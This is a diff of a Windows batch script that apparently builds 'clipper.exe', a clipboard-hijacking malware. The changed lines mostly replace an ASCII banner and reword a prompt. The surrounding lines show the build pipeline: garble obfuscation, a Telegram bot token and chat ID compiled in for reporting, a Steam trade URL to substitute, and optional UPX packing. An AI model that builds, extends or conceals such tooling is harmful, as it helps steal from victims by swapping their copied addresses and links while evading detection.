@@ -5,14 +5,13 @@ setlocal enabledelayedexpansion
 
 cls
 
+
 echo.
-echo ================================
-echo    ___      _ _    _         
-echo   ^| _ ^)_  _^(_^) ^|__^| ^|___ _ _ 
-echo   ^| _ ^\ ^|^| ^| ^| / _` / -_^) '_^|
-echo   ^|___^/\_,_^|_^|_\__,_\___^|_^|  
+echo    _ __ _   _ _ __   __ _
+echo   ^| '__^| ^| ^| ^| '_ \ / _` ^|
+echo   ^| ^|  ^| ^|_^| ^| ^| ^| ^| (_^| ^|
+echo   ^|_^|   \__,_^|_^| ^|_^ \__,_^| builder
 echo.
-echo ================================
 
 go install mvdan.cc/garble@latest
 if errorlevel 1 (
@@ -41,19 +40,12 @@ set /p "STEAM=Steam trade url: "
 
 cls
 
-title Builder
-
 echo.
-echo ================================
-echo    ___      _ _    _         
-echo   ^| _ ^)_  _^(_^) ^|__^| ^|___ _ _ 
-echo   ^| _ ^\ ^|^| ^| ^| / _` / -_^) '_^|
-echo   ^|___^/\_,_^|_^|_\__,_\___^|_^|  
+echo    _ __ _   _ _ __   __ _
+echo   ^| '__^| ^| ^| ^| '_ \ / _` ^|
+echo   ^| ^|  ^| ^|_^| ^| ^| ^| ^| (_^| ^|
+echo   ^|_^|   \__,_^|_^| ^|_^ \__,_^| building...
 echo.
-echo ================================
-echo.
-
-echo Building...
 
 set "LDFLAGS=-s -w -X main.bot_token=%BOT_TOKEN%"
 set "LDFLAGS=%LDFLAGS% -X main.chat_id=%CHAT_ID%"
@@ -77,7 +69,7 @@ echo.
 echo Build successful! File: .\clipper.exe
 
 echo.
-set /p "USE_UPX=Use UPX (y/n): "
+set /p "USE_UPX=Use UPX? (y/n): "
 
 if /i "%USE_UPX%"=="y" (
     echo.
